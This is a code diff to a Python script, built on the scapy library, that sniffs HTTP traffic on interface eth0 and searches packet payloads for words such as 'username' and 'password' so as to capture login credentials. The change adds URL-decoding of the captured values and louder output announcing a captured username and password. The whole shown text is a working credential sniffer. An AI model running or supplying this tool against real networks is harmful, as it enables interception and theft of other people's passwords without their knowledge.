@@ -1,5 +1,5 @@
 import scapy.all as scapy
-
+import urllib.parse
 from scapy.layers import http
 
 def sniff(interface):
@@ -14,7 +14,6 @@ def get_login_info(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
-            #load = str(load)
             keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
             for eachword in keybword:
                 if eachword.encode() in load:
@@ -28,6 +27,7 @@ def process_sniffed_packets(packet):
 
         login_info = get_login_info(packet)
         if login_info:
-            print("\n\n[+] Possible username and password >>" + str(login_info) + "\n\n")
+            print("[+] Possible USERNAME And PASSWORD Captured")
+            print("\t[x] USERNAME And PASSWORD >>" + urllib.parse.unquote(str(login_info)) + "\n\n")
 
 sniff('eth0')
